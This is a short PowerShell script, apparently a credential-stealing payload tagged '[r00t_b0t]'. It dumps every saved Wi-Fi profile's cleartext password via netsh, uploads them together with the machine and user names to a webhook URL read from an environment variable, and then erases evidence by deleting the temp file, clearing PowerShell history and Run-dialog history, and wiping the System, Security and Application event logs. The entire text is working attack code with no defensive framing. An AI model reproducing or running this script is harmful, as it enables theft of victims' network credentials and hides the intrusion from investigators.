$wh=$env:WH
$m="[r00t_b0t] "+$env:COMPUTERNAME+" | "+$env:USERNAME+"`n"
$profiles=netsh wlan show profiles|Select-String "All User Profile"
foreach($line in $profiles){
$n=($line -split ":")[1].Trim()
$key=netsh wlan show profile name=$n key=clear|Select-String "Key Content"
if($key){$m=$m+$n+" : "+($key -split ":")[1].Trim()+"`n"}
}
$f=$env:TEMP+"\r"+[string](Get-Random)+".txt"
$m|Out-File $f -Encoding UTF8
$boundary="----b"+[string](Get-Random)
$body="--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n{`"content`":`"[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME`"}`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"creds.txt`"`r`nContent-Type: text/plain`r`n`r`n$m`r`n--$boundary--"
Invoke-RestMethod -Uri $wh -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body ([System.Text.Encoding]::UTF8.GetBytes($body))
Remove-Item $f -Force -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
wevtutil cl System 2>$null
wevtutil cl Security 2>$null
wevtutil cl Application 2>$null
